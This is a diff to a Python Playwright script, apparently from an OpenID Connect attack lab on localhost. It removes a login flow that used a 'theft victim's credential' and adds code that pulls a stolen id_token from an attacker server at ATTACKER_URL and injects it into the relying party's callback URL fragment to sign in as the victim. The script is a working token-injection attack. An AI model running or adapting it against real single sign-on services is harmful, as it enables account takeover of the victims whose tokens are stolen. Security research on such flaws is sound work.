@@ -1,33 +1,22 @@
 import os
 import time
 import asyncio
+import httpx
 from bs4 import BeautifulSoup
 from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
 
 RP_URL = os.environ.get('RP_URL') or 'http://localhost:4444'
-
-# theft victim's credential
-victim_username = 'hoge'
-victim_password = 'hoge'
-
-async def sso_flow(page):
-    await page.goto(f"{RP_URL}/login")
-
-    await page.locator('input[name="userId"]').fill(f'{victim_username}')
-    await page.locator('input[name="password"]').fill(f'{victim_password}')
-    try:
-        # Click login button
-        await page.locator('button[type="submit"]').click(timeout=1000)
-
-        # Click continue button
-        await page.locator('input[value="Yes"]').click(timeout=1000)
-    except PlaywrightTimeoutError:
-        print("Timeout!")
-
-    return page
+ATTACKER_URL = os.environ.get('ATTACKER_URL') or "http://localhost:6666"
 
 async def main():
     async with async_playwright() as p:
+        # Get id_token from attacker server
+        async with httpx.AsyncClient() as client:
+            res = await client.get(f"{ATTACKER_URL}/data/id_token")
+            creds = res.json()
+            id_token = creds['id_token']
+        
+        # Sign in(attacker, attacker's browser)
         browser = await p.chromium.launch()
         context = await browser.new_context(ignore_https_errors=True)
         page = await context.new_page()
@@ -46,8 +35,7 @@ async def main():
             }
         })
 
-        # Sign in(attacker, attacker's browser)
-        page = await sso_flow(page)
+        await page.goto(f"{RP_URL}/callback#id_token={id_token}")
         await page.click('#loginButton')
         time.sleep(3) # wait 3 seconds
 
